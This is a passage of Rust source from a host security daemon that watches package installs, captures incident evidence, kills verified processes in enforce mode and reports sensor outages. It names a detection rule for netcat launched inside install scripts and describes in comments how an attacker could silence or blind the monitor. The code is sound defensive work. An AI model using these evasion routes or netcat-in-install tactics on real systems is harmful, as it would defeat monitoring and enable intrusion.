            &root.exec_id,
            &f.meta.family,
            f.hook_detail.as_deref(),
            f.file.as_ref().map(|x| x.path.as_str()),
            net.as_deref(),
            f.severity(),
            f.suppressed_by.is_none(),
        );
    }

    /// The subtree's **outermost** root exited: write the receipt.
    ///
    /// Only the outermost one, so a mise shim, the npm it execs and the nested
    /// `npm` frames of a lifecycle script are one install with one receipt.
    fn finish_receipt(&mut self, exec_id: &str, status: Option<u32>, now: u64) {
        let Some(me) = self.table.get(exec_id).cloned() else {
            return;
        };
        if !pkgtree::is_pkg_root(&me) {
            return;
        }
        if let Some(root) = pkgtree::pkg_root_for(&self.table, exec_id) {
            if root.exec_id != exec_id {
                return;
            }
        }
        let r = self.receipts.finish(&me, status, now);
        log::info!(
            "receipt {}: {} ({} script(s), {} destination(s), exit {})",
            r.id,
            r.render().lines().next().unwrap_or_default(),
            r.postinstall_scripts.len(),
            r.network.len(),
            r.exit
        );
        self.receipts.written += 1;
        if let Err(e) = self.store.append_receipt(&r) {
            log::error!("alerts.jsonl: {}", e);
        }
    }

    /// Every receipt ever written, oldest first.
    pub fn receipt_list(&self, last: usize) -> Vec<receipt::Receipt> {
        let mut all = self.store.receipts();
        if all.len() > last {
            all = all.split_off(all.len() - last);
        }
        all
    }

    // ------------------------------------------ incident snapshots, LEARNING §4

    pub fn incidents_dir(&self) -> PathBuf {
        self.cfg.analysis.bundle_dir.clone()
    }

    /// The process tree as the daemon's own table saw it — `tree.txt`, and the
    /// ancestry rows `bundle.md` uses.
    fn tree_rows(&self, f: &Finding) -> Vec<AncestryRow> {
        let mut rows: Vec<AncestryRow> = f
            .ancestry
            .iter()
            .rev()
            .map(|p| AncestryRow {
                pid: p.pid,
                exe: p.exe.clone(),
                args: p.args.clone(),
                cwd: p.cwd.clone(),
            })
            .collect();
        rows.push(AncestryRow {
            pid: f.proc.pid,
            exe: f.proc.exe.clone(),
            args: f.proc.args.clone(),
            cwd: f.proc.cwd.clone(),
        });
        rows
    }

    fn tree_text(rows: &[AncestryRow]) -> String {
        let mut out = String::from(
            "# process tree from moatd's own exec_id table, oldest first.\n\
             # Untrusted: argv and paths are what the processes claimed.\n",
        );
        for (n, r) in rows.iter().enumerate() {
            out.push_str(&format!(
                "{}{} pid {}\n{}    args: {}\n{}    cwd:  {}\n",
                "  ".repeat(n),
                r.exe,
                r.pid,
                "  ".repeat(n),
                r.args,
                "  ".repeat(n),
                r.cwd
            ));
        }
        out
    }

    /// LEARNING §4: capture before any kill. Returns `None` when the alert is
    /// below the threshold, is suppressed, or is one of moat's own meta-alerts
    /// (there is no third-party process to snapshot).
    fn capture_incident(&self, f: &Finding, id: &str) -> Option<incident::Incident> {
        if f.suppressed_by.is_some() {
            return None;
        }
        // A `signal` rule is a building block, not a detection (BASELINE §4):
        // no snapshot. `moat-exec-untrusted-tmpfs` fires hundreds of times a
        // day from this machine's own builds, and a snapshot each time is a
        // /proc walk plus a hash of every implicated file for a row nobody is
        // being asked about. The exception is the same one that puts it on the
        // badge -- inside a package install it IS a detection, and that is
        // precisely the case where the evidence has to exist afterwards.
        if f.is_building_block() {
            return None;
        }
        if !severity_at_least(f.severity(), &self.cfg.incidents.snapshot_min_severity) {
            return None;
        }
        if f.exec_id.is_empty() || f.proc.pid <= 1 {
            return None;
        }
        let rows = self.tree_rows(f);
        let ancestors: Vec<(u32, String)> =
            f.ancestry.iter().map(|p| (p.pid, p.exe.clone())).collect();
        let dir = self.incidents_dir();
        let file = f.file.as_ref().map(|x| x.path.clone());
        let inc = incident::capture(&incident::Target {
            id,
            base: &dir,
            group: &self.cfg.group,
            rule: &f.rule,
            severity: f.severity(),
            title: &f.meta.title,
            ts: &util::now_rfc3339(),
            context: f.context.as_str(),
            // The alert's own mode, not the daemon's: meta.json sits beside a
            // record that says `mode: enforce` and must not say monitor.
            mode: &f.mode,
            pid: f.proc.pid,
            exe: &f.proc.exe,
            args: &f.proc.args,
            cwd: &f.proc.cwd,
            file: file.as_deref(),
            script: f.actor.script.as_deref(),
            ancestors: &ancestors,
            tree: &Self::tree_text(&rows),
            homes: &self.homes,
        });
        // Retention is cheapest right after a capture, and it means the cap is
        // enforced even on a machine that never restarts the daemon.
        // Which incidents still want a human. An alert that has been acked, or
        // that the daemon never surfaced, is answered; those go first.
        let keep: std::collections::HashSet<String> = self
            .store
            .load()
            .iter()
            .filter(|a| !a.acked && a.surface == "alerts")
            // `dir` is the incident directory; its last component is the id
            // that `prune` works in.
            .filter_map(|a| {
                a.incident.as_ref().and_then(|i| {
                    std::path::Path::new(&i.dir)
                        .file_name()
                        .map(|n| n.to_string_lossy().to_string())
                })
            })
            .collect();
        for gone in incident::prune(
            &dir,
            self.cfg.incidents.retain_days,
            self.cfg.incidents.retain_max,
            util::unix_secs(),
            &keep,
        ) {
            log::info!("incident retention: removed {}", gone);
        }
        Some(inc)
    }

    // ------------------------------------------------------ bundle, LEARNING §2

    /// Write `<incidents dir>/<id>/bundle.md` and return its path.
    ///
    /// The daemon only ever writes the file. Launching the agent is
    /// `moatctl analyze`'s job, in the user's session (LEARNING §2, §7).
    pub fn write_bundle(&self, id: &str) -> Result<PathBuf, String> {
        let alert = self
            .find_alert(id)
            .ok_or_else(|| format!("no alert {}", id))?;
        let all = self.store.load();
        let receipts = self.store.receipts();
        let related_alerts = bundle::related_alerts(&alert, &all, bundle::RELATED_WINDOW_SECS);
        let related_receipts =
            bundle::related_receipts(&alert, &receipts, bundle::RELATED_WINDOW_SECS);

        // The alert on disk records ancestors as pid + exe only; the live table
        // still has argv and cwd for the ones that have not been pruned.
        let mut ancestry: Vec<AncestryRow> = alert
            .process
            .ancestry
            .iter()
            .rev()
            .map(|a| {
                let live = self
                    .table
                    .find_by_pid(a.pid)
                    .filter(|p| p.exe == a.exe || a.exe.is_empty());
                AncestryRow {
                    pid: a.pid,
                    exe: a.exe.clone(),
                    args: live.map(|p| p.args.clone()).unwrap_or_default(),
                    cwd: live.map(|p| p.cwd.clone()).unwrap_or_default(),
                }
            })
            .collect();
        ancestry.push(AncestryRow {
            pid: alert.process.pid,
            exe: alert.process.exe.clone(),
            args: alert.process.args.clone(),
            cwd: alert.process.cwd.clone(),
        });

        let dir = self.incidents_dir().join(id);
        let meta: Option<Value> = std::fs::read_to_string(dir.join("meta.json"))
            .ok()
            .and_then(|t| serde_json::from_str(&t).ok());
        // Stage what the agent is allowed to read, into the same directory the
        // bundle lives in. evidence.rs decides what may be copied; a cred
        // rule's target never is.
        let _ = std::fs::create_dir_all(&dir);
        let artifacts = crate::evidence::stage(&alert, &dir, crate::evidence::MAX_STAGED_BYTES, &self.cfg.group);
        let body = bundle::render(&bundle::Input {
            alert: &alert,
            // The table the agent reads is about `alert`; every other cell in
            // it comes from the record, and so does this one.
            mode: &alert.mode,
            ancestry: &ancestry,
            related_alerts: &related_alerts,
            related_receipts: &related_receipts,
            incident: meta.as_ref(),
            incident_dir: meta.as_ref().map(|_| dir.as_path()),
            allowlist_dir: &self.cfg.paths.allowlist_dir.display().to_string(),
            artifacts: &artifacts,
            version: crate::VERSION,
        });
        bundle::write(&dir, &body, &self.cfg.group)
            .map_err(|e| format!("{}: {}", dir.display(), e))
    }

    // ------------------------------------------------------ digest, LEARNING §5

    /// The weekly summary. Computed by the daemon, delivered by
    /// `moatctl digest --notify` from the user's session.
    pub fn digest(&self, now: u64) -> digest::Digest {
        let since = now.saturating_sub(7 * 86_400);
        let in_window = |ts: &str| {
            util::rfc3339_to_nanos(ts)
                .map(|n| (n / 1_000_000_000) as u64 >= since)
                .unwrap_or(true)
        };
        // The same three populations `status.ledger` names, over one week. A
        // `signal` building block is not an incident, whatever its severity:
        // that is what declaring the tier means.
        let incidents = self.store.count_alerts(|a| {
            !a.is_suppressed() && !a.is_building_block() && a.severity_rank() >= 2 && in_window(&a.ts)
        }) as u64;
        let recorded = self
            .store
            .count_alerts(|a| !a.is_suppressed() && a.surface != "alerts" && in_window(&a.ts))
            as u64;
        let suppressed = self
            .store
            .count_alerts(|a| a.is_suppressed() && in_window(&a.ts)) as u64;
        let installs = self
            .store
            .receipts()
            .iter()
            .filter(|r| in_window(&r.started))
            .count() as u64;
        digest::Digest {
            enabled: self.digest_enabled,
            due: digest::next_due(now, &self.cfg.digest.weekday, self.cfg.digest.hour),
            last_sent: self.digest_last_sent,
            summary: digest::Summary {
                incidents,
                recorded,
                suppressed,
                installs,
                proposals: self.baseline.proposals().len() as u64,
            },
            weekday: self.cfg.digest.weekday.clone(),
            hour: self.cfg.digest.hour,
        }
    }

    /// `moatctl set digest on|off`.
    pub fn set_digest(&mut self, on: bool) {
        self.digest_enabled = on;
        self.write_state();
        log::info!("weekly digest {}", if on { "on" } else { "off" });
    }

    /// `moatctl digest --notify` reports back that it delivered one, so a
    /// catch-up run after a suspend does not send twice.
    pub fn digest_sent(&mut self, now: u64) {
        self.digest_last_sent = now;
        self.write_state();
    }

    // ---------------------------------------------------- the noise guard §4

    /// How long moat was down before this start, in seconds.
    ///
    /// `state.json` carries a heartbeat written on every save. If the gap
    /// between that and now is longer than a restart takes, something stopped
    /// the daemon -- an update, a reboot, a crash, or somebody with root who
    /// wanted a window. Whichever it was, the hole belongs on the timeline,
    /// because nothing else records it: `Restart=always` brings the process
    /// back and says nothing about what was missed.
    pub fn downtime_secs(&self) -> u64 {
        self.started.saturating_sub(self.last_heartbeat)
    }

    /// Say so, once, at the start of a run.
    pub fn report_downtime(&mut self) {
        // A gap under a minute is a restart, which the user just did on
        // purpose or an upgrade just did for them.
        const FLOOR: u64 = 60;
        if self.last_heartbeat == 0 {
            return; // first ever start: no record to have a hole in
        }
        let gap = self.downtime_secs();
        if gap < FLOOR {
            return;
        }
        let mins = gap / 60;
        log::warn!("moat was not running for {} minutes before this start", mins);
        let meta = crate::rules::was_down_meta(mins);
        let mut f = Finding::new(crate::rules::WAS_DOWN, meta, self_proc("startup"));
        f.hook = "userland".into();
        f.mode = self.mode.clone();
        f.extra_evidence.push(format!(
            "last heartbeat {}, started {} -- a {} second hole",
            crate::util::rfc3339_of(self.last_heartbeat),
            crate::util::rfc3339_of(self.started),
            gap
        ));
        self.in_meta_alert = true;
        let _ = self.emit(f);
        self.in_meta_alert = false;
    }

    /// Something asked for `status`. Almost always the panel.
    pub fn note_watcher(&mut self, now: u64) {
        self.last_watched = now;
    }

    /// Notice when alerts are stacking up and nothing is reading them.
    ///
    /// Every notification moat produces is drawn by a program in the user's own
    /// session -- the panel, and the digest timer -- so anything running as the
    /// user can silence the whole product by killing one process. That is the
    /// cheapest attack on this design: no evasion, no privilege, just `pkill`,
    /// and moatd goes on recording perfectly while nobody sees any of it.
    ///
    /// moatd is root and the attacker cannot stop it, so the noticing belongs
    /// here. It cannot draw a notification itself (that needs the user's
    /// session bus), but it can put the gap on the record, where the panel will
    /// show it the moment one comes back -- and where an offline reader of
    /// alerts.jsonl sees it regardless.
    pub fn watchdog_tick(&mut self, now: u64) {
        const QUIET: u64 = 1800;
        const REPEAT: u64 = 21_600;
        let quiet_for = now.saturating_sub(self.last_watched);
        if quiet_for < QUIET {
            return;
        }
        // Only what reached the badge: a timeline entry nobody read is not a
        // missed warning, it is the timeline working as intended. This is the
        // same count `status` reports as `unacked` -- it used to be a second
        // filter with one more clause, so `moatctl status` said "high 243"
        // while this said 8 were waiting.
        let unacked: u64 = self.store.unacked().values().sum();
        if unacked == 0 {
            return;
        }
        if now.saturating_sub(self.last_unwatched_alert) < REPEAT {
            return;
        }
        self.last_unwatched_alert = now;
        if self.in_meta_alert {
            return;
        }
        let mins = quiet_for / 60;
        log::warn!("nobody has read moat's status in {} minutes, {} alerts waiting", mins, unacked);
        let meta = crate::rules::unwatched_meta(unacked, mins);
        let mut f = Finding::new(crate::rules::UNWATCHED, meta, self_proc("watchdog"));
        f.hook = "userland".into();
        f.mode = self.mode.clone();
        f.extra_evidence.push(format!(
            "no status read for {} minutes; {} surfaced alert(s) unanswered",
            mins, unacked
        ));
        self.in_meta_alert = true;
        let _ = self.emit(f);
        self.in_meta_alert = false;
    }

    /// The sensor is dropping events. Say so, once per hour per cgroup.
    ///
    /// This is the only failure in the whole design where the evidence is what
    /// goes missing: every other evasion leaves a record somewhere. Rate-limited
    /// because a throttle repeats for as long as the flood does, and a thousand
    /// alerts about a thousand missing alerts helps nobody.
    fn note_throttle(&mut self, t: &crate::event::ThrottleEvent, now: u64) {
        if t.kind.as_deref() == Some("THROTTLE_STOP") {
            return;
        }
        let cgroup = t.cgroup.clone().unwrap_or_default();
        let last = self.throttle_seen.get(&cgroup).copied().unwrap_or(0);
        if now.saturating_sub(last) < 3600 {
            return;
        }
        self.throttle_seen.insert(cgroup.clone(), now);
        if self.in_meta_alert {
            return;
        }
        log::warn!("sensor throttled for {}: events are being dropped", cgroup);
        let meta = crate::rules::sensor_throttled_meta(&cgroup);
        let mut f = Finding::new(crate::rules::SENSOR_THROTTLED, meta, self_proc("throttle"));
        f.hook = "userland".into();
        f.mode = self.mode.clone();
        f.extra_evidence
            .push("events from this cgroup were discarded by the sensor, not by moat".into());
        if !cgroup.is_empty() {
            f.extra_evidence.push(format!("cgroup: {}", cgroup));
        }
        self.in_meta_alert = true;
        let _ = self.emit(f);
        self.in_meta_alert = false;
    }

    /// Record that a protection was weakened, and by whom.
    ///
    /// `who` comes from `SO_PEERCRED` -- the kernel's answer about the process
    /// on the other end of the socket, which the caller cannot forge. Before
    /// this, every mutating command was anonymous: `moatctl ignore --scope rule`
    /// silenced a whole detection class and the only trace was a line in root's
    /// journal, which the user being protected cannot read. An off switch the
    /// attacker can reach and nobody can see them reach is not a control.
    pub fn raise_protection_change(&mut self, action: &str, who: &str, detail: Vec<String>) {
        if self.in_meta_alert {
            return;
        }
        let meta = crate::rules::protection_changed_meta(action, who);
        let mut f = Finding::new(crate::rules::PROTECTION_CHANGED, meta, self_proc(action));
        f.hook = "userland".into();
        f.mode = self.mode.clone();
        f.what_override = Some(format!("{} asked Moat to {}.", who, action));
        f.extra_evidence.push(format!("requested by {}", who));
        f.extra_evidence.extend(detail);
        self.in_meta_alert = true;
        let _ = self.emit(f);
        self.in_meta_alert = false;
    }

    /// One `moat-x-noisy-rule` alert per demotion, naming the top five tuples
    /// and offering both "these are expected" and "keep watching".
    fn raise_noisy_rule(&mut self, d: &Demotion, now: u64) {
        if self.in_meta_alert {
            return;
        }
        let top = self.baseline.top_tuples(&d.rule, 5);
        let meta = crate::rules::noisy_rule_meta(&d.rule, d.count, self.cfg.baseline.noisy_rule_per_day);
        let mut f = Finding::new(crate::rules::NOISY_RULE, meta, self_proc(&d.rule));
        f.hook = "userland".into();
        f.mode = self.mode.clone();
        f.what_override = Some(format!(
            "{} raised {} alerts in the last 24 hours, so Moat moved it to the timeline instead \
             of turning it off.",
            d.rule, d.count
        ));
        f.extra_evidence.push(format!(
            "rolling 24 h count for {}: {} (threshold {})",
            d.rule, d.count, self.cfg.baseline.noisy_rule_per_day
        ));
        // A rule quiet in many shapes at once is the rule being wrong, not one
        // workload being loud. Said here, once, instead of silencing the rule:
        // a rule-wide demotion covers shapes nobody has seen, and on 2026-09-04
        // that hid a real /tmp dropper inside a package install (BASELINE §4).
        if d.patterns_quiet >= self.baseline.noisy_rule_fanout {
            f.extra_evidence.push(format!(
                "{} distinct patterns of {} are now quiet. That is the rule being wrong for this \
                 machine rather than one noisy workload: it wants retuning, or a \
                 `moat.omarchy/tier: signal` declaration if it is a building block other rules \
                 correlate on. Moat has NOT silenced the rest of the rule — a shape nobody has \
                 seen yet still reaches the badge.",
                d.patterns_quiet, d.rule
            ));
        }
        if top.is_empty() {
            f.extra_evidence
                .push("no per-tuple history yet for this rule".into());
        }
        for (i, t) in top.iter().enumerate() {
            f.extra_evidence.push(format!(
                "top {}: {} {}{} — {} time{} on {} day{}",
                i + 1,
                t.exe,
                if t.dir.is_empty() { "" } else { "on " },
                if t.dir.is_empty() { "(no file)".to_string() } else { t.dir.clone() },
                t.count,
                if t.count == 1 { "" } else { "s" },
                t.days.len(),
                if t.days.len() == 1 { "" } else { "s" }
            ));
        }
        let block: String = top.iter().map(|t| t.toml()).collect::<Vec<_>>().join("\n");
        f.extra_options = vec![
            ExplainOption {
                scope: "these-are-expected".into(),
                cmd: format!("moatctl baseline propose --rule {}", d.rule),
                line: if block.is_empty() {
                    format!("# no tuples recorded yet for {}", d.rule)
                } else {
                    block
                },
            },
            ExplainOption {
                scope: "keep-watching".into(),
                cmd: format!("moatctl baseline undemote {}", d.rule),
                line: format!(
                    "# clears the demotion; {} goes back to the Alerts tab and the 24 h window \
                     starts over\n",
                    d.rule
                ),
            },
        ];
        self.in_meta_alert = true;
        self.emit(f);
        self.in_meta_alert = false;
        let _ = now;
    }

    // ------------------------------------------- pacman transactions, LEARNING §1

    /// Re-read the pacman database when it moved, and re-check every learned
    /// baseline entry against it: an entry whose actor stopped being official is
    /// disabled in place, with a reason, and a low alert says so.
    pub fn on_pacman_change(&mut self) -> usize {
        if !self.provenance.refresh_if_changed() {
            return 0;
        }
        self.revoke_stale_learned_entries()
    }

    /// The re-check itself. Public so it can be driven directly (and tested)
    /// without waiting for a filesystem mtime to move.
    pub fn revoke_stale_learned_entries(&mut self) -> usize {
        let path = self.cfg.paths.baseline_allowlist();
        let mut revoked = 0;
        for e in self.baseline.learned_entries() {
            let (prov, package) = self.provenance.classify_path(&e.exe);
            if prov.is_official() {
                continue;
            }
            let reason = format!(
                "{}: the actor {} is no longer official (now {}{}), so this learned entry no \
                 longer stands",
                e.rule,
                e.exe,
                prov,
                package.map(|p| format!(", package {}", p)).unwrap_or_default()
            );
            if let Some(t) = self.baseline.state.tuples.get(&e.key).cloned() {
                match crate::allowlist::find_index(&path, &t.spec()) {
                    Some(idx) => {
                        if let Err(err) = crate::allowlist::disable_rule(&path, idx, &reason) {
                            log::warn!("{}: {}", path.display(), err);
                        }
                    }
                    None => log::debug!("baseline: no block in {} for {}", path.display(), e.key),
                }
            }
            self.baseline.mark_revoked(&e.key, &reason);
            revoked += 1;

            let meta = crate::rules::baseline_revoked_meta(&e.rule);
            let mut f = Finding::new(crate::rules::BASELINE_REVOKED, meta, self_proc(&e.rule));
            f.mode = self.mode.clone();
            f.what_override = Some(format!(
                "A learned baseline entry for {} was disabled: {} is no longer shipped by a \
                 trusted repository.",
                e.rule, e.exe
            ));
            f.extra_evidence = vec![reason.clone(), format!("entry written {}", e.written)];
            self.in_meta_alert = true;
            self.emit(f);
            self.in_meta_alert = false;
        }
        if revoked > 0 {
            self.reload_allowlist();
        }
        revoked
    }

    /// Periodic upkeep: demotions that have gone quiet, and the two files.
    /// Called wherever `baseline_tick` is: expiring a containment is time
    /// passing, not an event arriving, so it cannot hang off the event path.
    pub fn tick(&mut self, now: u64, force_save: bool) {
        self.baseline_tick(now, force_save);
        self.contain_tick(now);
        self.watchdog_tick(now);
        // Arming first: it owns the verification while it is still working, and
        // `verify_tick` stands down for exactly that window.
        self.arm_tick(now);
        self.verify_tick(now);
    }

    pub fn baseline_tick(&mut self, now: u64, force_save: bool) {
        // Evict the dedupe map here, or it grows forever.
        //
        // The `dedupe_secs` filter makes an old entry INEFFECTIVE; it never
        // removed one. The key is (rule, exe, file path), all attacker-chosen,
        // so a loop touching a fresh path each time grew a permanent map -- and
        // because a miss is also what triggers an incident capture, the same
        // loop rolled the 200-directory retention window and evicted real
        // evidence while it did it.
        let window = self.cfg.thresholds.dedupe_secs;
        self.dedupe
            .retain(|_, v| now.saturating_sub(v.first_seen) < window.max(1));

        for rule in self.baseline.clear_stale_demotions(now) {
            log::info!("noise guard: {} is quiet again; the demotion is cleared", rule);
        }
        // An install whose exit line we never saw (restart, rotation, a dropped
        // event) would otherwise sit in the tracker for ever.
        // `ChainStore::note` prunes on every observation, so the bound holds
        // even here; this is for the machine that goes quiet with a chain open,
        // which would otherwise hold it until the next alert.
        self.chains.prune(now);
        let dropped = self.receipts.prune(now, 6 * 3_600);
        if dropped > 0 {
            log::debug!("receipts: dropped {} install(s) with no exit", dropped);
        }
        self.rarity.save_if_due(now, force_save);
        self.baseline.save_if_due(now, force_save);
    }

    /// A userland rule that enforces in the daemon (currently only
    /// `moat-pkg-subtree-netcat-exec`) kills **only** in enforce mode, and only
    /// after `/proc/<pid>` proves the pid is still the process the finding
    /// names — the same start-time check the `kill` socket command uses, so a
    /// recycled pid is never signalled.
    ///
    /// Returns whether the process was actually killed; the outcome is recorded
    /// as evidence either way, because "we tried and it was already gone" and
    /// "we killed it" are different facts.
    fn maybe_enforce(&self, f: &mut Finding) -> bool {
        if !f.request_kill {
            return false;
        }
        // `mode_for`, not `self.mode`. The rule asked because IT is armed --
        // either daemon-wide or on its own -- and reading the daemon-wide mode
        // here vetoed every per-rule arming: `moatctl set mode enforce --rule
        // moat-shell-stdio-socket` recorded the arming, the rule set
        // `request_kill`, and this returned false because the daemon was still
        // in monitor. Belt and braces either way: the rule checks first.
        if self.mode_for(&f.rule) != "enforce" {
            return false;
        }
        let pid = f.proc.pid;
        let start = util::normalize_ts(&f.proc.start_time);
        if pid <= 1 {
            f.extra_evidence
                .push("enforce mode: no usable pid to signal".into());
            return false;
        }
        if let Err(e) = crate::control::verify_pid(pid, &start, &f.proc.exe) {
            log::warn!("{}: not killing pid {}: {}", f.rule, pid, e);
            f.extra_evidence.push(format!(
                "enforce mode: pid {} was NOT killed — {}",
                pid, e
            ));
            return false;
        }
        let rc = unsafe { libc::kill(pid as libc::pid_t, libc::SIGKILL) };
        if rc == 0 {
            log::info!("{}: SIGKILL sent to pid {} (enforce mode)", f.rule, pid);
            f.extra_evidence.push(format!(
                "enforce mode: moatd sent SIGKILL to pid {} after verifying its start time",
                pid
            ));
            true
        } else {
            let e = std::io::Error::last_os_error();
            log::warn!("{}: kill({}) failed: {}", f.rule, pid, e);
            f.extra_evidence.push(format!(
                "enforce mode: pid {} was NOT killed — kill() failed: {}",
                pid, e
            ));
            false
        }
    }

    /// NOTES §7: `action: KPROBE_ACTION_SIGKILL` is reported in monitor mode
    /// too. Only a `process_exit` carrying `signal: SIGKILL` proves the kill.
    fn confirm_kill(&mut self, exec_id: &str, signal: Option<&str>) {
        let Some(alert_id) = self.pending_kill.remove(exec_id) else {
            return;
        };
        if signal != Some("SIGKILL") {
            log::debug!(
                "alert {}: policy asked for a kill but exit signal was {:?}; action_taken stays none",
                alert_id,
                signal
            );
            return;
        }
        let u = UpdateLine::new(&alert_id).set("action_taken", Value::from("killed"));
        if let Err(e) = self.store.append_update(&u) {
            log::error!("alerts.jsonl: {}", e);
        } else {
            log::info!("alert {}: kill confirmed by process_exit SIGKILL", alert_id);
        }
    }

    pub fn mark(&mut self, id: &str, key: &str, value: Value) -> Result<(), String> {
        self.store
            .append_update(&UpdateLine::new(id).set(key, value))
            .map_err(|e| e.to_string())
    }

    pub fn find_alert(&self, id: &str) -> Option<Alert> {
        self.store.find(id)
    }

    // ----------------------------------------------------------------- status

    /// The mode that actually governed this rule, which is not always the
    /// daemon's.
    ///
    /// A rule armed with `set mode enforce --rule NAME` kills in the kernel
    /// while the daemon stays in monitor, so recording the daemon's mode
    /// produced an alert reading `action: killed` next to `mode: monitor` —
    /// a record that contradicts itself, and the third time today that a
    /// stored field disagreed with what actually happened.
    pub fn mode_for(&self, rule: &str) -> String {
        if self.enforcing_rules.contains(rule) {
            "enforce".to_string()
        } else {
            self.mode.clone()
        }
    }

    /// TracingPolicies the kernel is actually running, counted from the
    /// directories Tetragon pins under its bpffs dir (one per loaded policy).
    ///
    /// `None` means the directory could not be read at all — not mounted, or
    /// this process is not root — which is different from "zero loaded" and
    /// must not be reported as an outage.
    pub fn sensors_loaded(&self) -> Option<usize> {
        let entries = std::fs::read_dir(&self.cfg.paths.tetragon_bpf_dir).ok()?;
        Some(
            entries
                .filter_map(|e| e.ok())
                .filter(|e| e.file_name().to_string_lossy().starts_with("moat-"))
                .count(),
        )
    }

    /// Is the sensor doing its job, in the only terms that matter: how many of
    /// our policies are loaded in the kernel right now.
    ///
    /// The two obvious signals both lie. The gRPC socket is a file that
    /// outlives the process that made it, and the export log keeps getting
    /// fresh writes during a crash loop because every Tetragon start re-walks
    /// `/proc` and re-emits an exec event per live process. On 2026-09-03 this
    /// function returned "running" for 25 minutes while Tetragon was exiting
    /// 255 every 13 seconds and **zero** policies were loaded — the machine was
    /// completely unprotected and every surface said it was fine. Counting
    /// pinned policies is the fix: it asks the kernel, and it goes to zero the
    /// instant the sensor dies.
    /// Rules that are switched ON but cannot possibly fire on this sensor.
    ///
    /// `exec_memfd` and `exec_privileges_raised` read
    /// `process.binary_properties`, which Tetragon only attaches when it runs
    /// with `--enable-process-cred` -- the whole message, including the
    /// unlinked-binary annotation, sits behind that one flag in
    /// `pkg/process/process.go`. Without it both rules are live, configured,
    /// documented, and dead: the exact shape of the containment policy that
    /// loaded, armed and matched nothing for a day on 2026-09-05.
    ///
    /// So moat says so, in `status`, rather than presenting silence as
    /// coverage. Checked against the file rather than the running sensor
    /// because the flag is only readable from the conf.d fragment.
    pub fn inert_rules(&self) -> Vec<String> {
        let needs_cred = [
            ("moat-x-exec-memfd", self.cfg.rules.exec_memfd),
            ("moat-x-exec-privileges-raised", self.cfg.rules.exec_privileges_raised),
        ];
        if !needs_cred.iter().any(|(_, on)| *on) {
            return Vec::new();
        }
        // Sibling of the export-allowlist fragment, so this follows the
        // configured conf.d directory instead of a hardcoded /etc path -- which
        // also stops the test depending on the state of THIS machine's /etc.
        // A test that passes only where the product is not installed is not a
        // test, and the scanner suite had the same fault this morning.
        let Some(confd) = self.cfg.paths.export_allowlist.parent() else {
            return Vec::new();
        };
        let enabled = std::fs::read_to_string(confd.join("enable-process-cred"))
            .map(|t| t.trim().eq_ignore_ascii_case("true"))
            .unwrap_or(false);
        if enabled {
            return Vec::new();
        }
        needs_cred
            .iter()
            .filter(|(_, on)| *on)
            .map(|(id, _)| (*id).to_string())
            .collect()
    }

    pub fn tetragon_state(&self) -> String {
        let expected = self.policies.len();
        match self.sensors_loaded() {
            Some(0) if expected > 0 => "down".into(),
            Some(n) if n < expected => format!("degraded {}/{}", n, expected),
            Some(_) => "running".into(),
            // Cannot see bpffs. Fall back to the old, weaker heuristics, but
            // never claim more than "unverified" from them.
            None => {
                if self.cfg.paths.tetragon_socket.exists() {
                    return "unverified".into();
                }
                if let Ok(m) = std::fs::metadata(&self.cfg.paths.tetragon_log) {
                    use std::os::unix::fs::MetadataExt;
                    let age = util::unix_secs().saturating_sub(m.mtime().max(0) as u64);
                    if age < 300 {
                        return "unverified".into();
                    }
                    return "stale".into();
                }
                "stopped".into()
            }
        }
    }

    /// True when the sensor is not fully loaded. The shield must not be green
    /// here no matter how quiet the alert counts are: no alerts from a dead
    /// sensor is the most dangerous shape of "quiet" there is.
    pub fn sensor_unhealthy(&self) -> bool {
        !matches!(self.tetragon_state().as_str(), "running" | "unverified")
    }

    pub fn sandbox_on(&self) -> bool {
        self.cfg.paths.sandbox_flag.exists()
    }

    pub fn status(&self) -> Value {
        let unacked = self.store.unacked();
        let ledger = self.store.ledger();
        let now = util::unix_secs();
        let mut digest_summary = self.digest(now).to_json();
        if let Some(o) = digest_summary.as_object_mut() {
            o.insert("last_sent_unix".into(), Value::from(self.digest_last_sent));
        }
        let mut out = json!({
            "ok": true,
            "version": crate::VERSION,
            "mode": self.mode,
            "enforcing_rules": self.enforcing_rules.iter().cloned().collect::<Vec<_>>(),
            "tetragon": self.tetragon_state(),
            // `policies` is what is on disk; `sensors_loaded` is what the
            // kernel is running. They are equal on a healthy machine and the
            // gap between them is the whole point of reporting both.
            "policies": self.policies.len(),
            "sensors_loaded": self.sensors_loaded(),
            "sensor_unhealthy": self.sensor_unhealthy(),
            "policies_failed": self.policies_failed,
            "feeds": {
                "updated": self.feeds.meta.updated,
                "hashes": self.feeds.meta.hashes,
                "domains": self.feeds.meta.domains,
                "urls": self.feeds.meta.urls,
            },
            "unacked": unacked,
            "sandbox": self.sandbox_on(),
            // Whether the *caller* is in the group is a client-side question:
            // if it were not, it could not have reached this socket.
            "socket_group": self.cfg.group,
            "uptime_secs": now.saturating_sub(self.started),
            "events_seen": self.events_seen,
            "alerts": self.alerts_emitted,
            "alerts_suppressed": self.alerts_suppressed,
            "processes": self.table.len(),
            "allowlist_rules": self.allowlist.len(),

            // --- BASELINE §8 "Resolved shapes" ---------------------------
            "installed_at": util::rfc3339_of(self.baseline.state.installed_at),
            "baseline": self.baseline.status(now),
            "proposals": self.baseline.proposals(),
            "demoted_rules": self.baseline.demoted_rules(),
            // LEARNING §2c. The panel needs this to tell "no verdict yet"
            // apart from "verdicts are switched off": without it an untriaged
            // incident shows nothing about analysis at all and the feature is
            // invisible until it happens to have finished.
            "auto_triage": self.cfg.analysis.auto_triage.as_str(),
            // The badge, and nothing else — the same set `cmd_triage` offers,
            // or the panel counts work the runner will never be given. A
            // `signal` row is on the timeline by construction and so is out of
            // this number; a suppressed row is out of it explicitly.
            "triage_pending": self.store.count_alerts(|a| {
                a.surface == "alerts" && !a.acked && !a.is_suppressed() && a.triage.is_none()
            }),
            "rarity_counters": self.rarity.len(),

            // --- telemetry -------------------------------------------------
            // What is being RECORDED, on the same response as what is being
            // detected. A reader that sees `sensor_unhealthy: false` and
            // `telemetry.classes: ["alerts"]` knows exactly how much of this
            // machine's history exists, which is the honest answer to "can I
            // go back and look".
            "telemetry": {
                "classes": self.cfg.telemetry.classes(),
                "written": self.telemetry_written,
                "filtered": self.telemetry_filtered,
                "file": self.telemetry.as_ref().map(|t| t.path().display().to_string()),
            },

            // --- LEARNING §9 "Resolved shapes" ----------------------------
            // `digest` is the boolean the plugin's settings row binds to;
            // `digest_summary` is the {due, text} block LEARNING §5 asks the
            // daemon to publish, which `moatctl digest` prints and the user
            // timer delivers.
